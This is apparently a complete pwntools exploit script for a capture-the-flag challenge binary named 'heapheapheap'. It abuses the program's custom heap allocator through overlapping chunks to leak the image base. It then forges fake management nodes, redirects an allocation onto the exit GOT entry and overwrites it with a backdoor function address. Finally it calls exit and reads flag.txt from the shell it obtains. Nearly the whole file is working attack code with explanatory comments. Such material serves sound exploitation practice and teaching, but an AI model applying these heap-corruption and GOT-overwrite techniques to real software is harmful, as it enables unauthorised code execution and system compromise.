#! /usr/bin/env python3
from pwn import *

context.binary = e = ELF("./heapheapheap")

p = process()


def add(p: remote, s, v, length=None):
    p.sendlineafter(b"Your choice: ", b"1")
    if length is not None:
        p.sendlineafter(b"Enter length", str(length).encode())
    else:
        p.sendlineafter(b"Enter length", str(len(s) + 1).encode())
    p.sendlineafter(b"Enter string: ", s)
    p.sendlineafter(b"Enter value: ", str(v).encode())


def delete(p: remote):
    p.sendlineafter(b"Your choice: ", b"3")
    p.recvuntil(b"The largest element is '")
    string = p.recvuntil(b"'")[:-1]
    p.recvuntil(b"with a value of ")
    return string, int(p.recvline())


def edit(p: remote, s, v, length=None):
    p.sendlineafter(b"Your choice: ", b"2")
    if length is not None:
        p.sendlineafter(b"Enter length", str(length).encode())
    else:
        p.sendlineafter(b"Enter length", str(len(s) + 1).encode())
    p.sendlineafter(b"Enter string: ", s)
    p.sendlineafter(b"Enter value: ", str(v).encode())

mem_offset = 0x4100
heap_offset = 0x5100
exit_got_plt_offset = 0x4058
backdoor_offset = 0x1c0e

if __name__ == '__main__':
    length_chunk_a = 0xa00
    length_chunk_b = 0x100
    length_chunk_c = 0x1000 - 0x28 * 3 * 3 - length_chunk_a - length_chunk_b
    add(p, b"a" * (length_chunk_a - 1), 1337)
    add(p, b"b" * (length_chunk_b - 1), 1336)
    add(p, b"c" * (length_chunk_c - 1), 420)
    edit(p, b"\x00" * (length_chunk_a - 0x20 - 1), 69)
    edit(p, b"b" * 0x10, 70, length=length_chunk_b + 0x28 * 3)

    p.recvuntil(b"69")
    p.recvuntil(b"\n")
    p.recvuntil(b"\n")
    img_leak = int(p.recvuntil(b"\n\nMenu:\n", drop=True))
    img_base = img_leak - 0x4d20
    log.info(f"Image base address: {hex(img_base)}")

    fake_chunks_addr = img_base + mem_offset + 0x200

    bytes_to_heap = (
        0x20 # heap node of chunk c, except 8B we overlapped
        + 0x28 # management chunk of chunk c
        + length_chunk_c
        - 0x28 * 2 # the following add allocates two additional nodes: 1 management + 1 heap  
    )

    # cleanup heap
    heap_clean_payload = (
        b"\x00" * bytes_to_heap # padding
        + p64(fake_chunks_addr) # insert pointer to address where we will put a fake chunk
        + p64(1)[:7] # set heap.num_nodes to 1; solely for beauty and for easier debugging, not strictly required, but this value must be < 250 to pass sanity checks
    )
    add(p, heap_clean_payload, 10000)

    # add additional chunk
    additional_chunk_len = 0x10
    add(p, b"BEEF" * 2, 500, length=additional_chunk_len)


    # calculate the address of current heap_heap.heap.cur
    cur_top_free_node = (
        img_base 
        + heap_offset
        + 0x10 # sizeof(struct Heap)
        + 0x28 * 3 # previous add allocated 3 nodes: 2 management + 1 heap
        + additional_chunk_len
    )

    pivot_length = (
        fake_chunks_addr 
        - 0x28 # fake_chunks_addr is the address of the heap node, we want need the address of its management node here
        - (
            cur_top_free_node
            + 0x28 # start of the data of the current top free node
        )
        - 0x28 # we actually want to place the actual management node before our fake management node
    ) & 0xFFFFFFFFFFFFFFFF # convert to unsigned

    # pivot to chunk we left previously in heap, so that we can now overwrite it with contents we want
    edit(p, b"", 42, length=pivot_length)

    fake_man_node = (
        p64(0x28) # value / size
        + p64(0) # left
        + p64(0) # right
        + p64(0) # parent (as long as we don't free it, no problem to set to zero)
        + p64(fake_chunks_addr) # data -> heap node
    )

    fake_node = (
        p64(0x1000) # value
        + p64(0) # left
        + p64(0) # right
        + p64(img_base + 0x5138) # parent, keep
        + p64(fake_chunks_addr + 0x28 * 2) # data -> string
    )

    fake_man_node_2 = (
        p64(0x50000) # value / size
        + p64(0) # left
        + p64(0) # right
        + p64(0) # parent (see other mem node)
        + p64(img_base + exit_got_plt_offset) # data
    )

    edit(p, fake_man_node + fake_node + fake_man_node_2, 43)

    # trigger correct insertion of fake chunk (to the top of the heap)
    edit(p, p64(0x1000)[:7], 43)

    # put fake data pointer into free heap
    delete(p)

    # allocate node at injected data pointer in GOT, place backdoor address into exit@got[plt]
    edit(p, p64(img_base + backdoor_offset), 0x6789, length=0x50000)

    # call exit => backdoor
    p.sendlineafter(b"Your choice: ", b"4")
    p.clean()

    p.sendline(b"cat flag.txt")

    p.interactive()
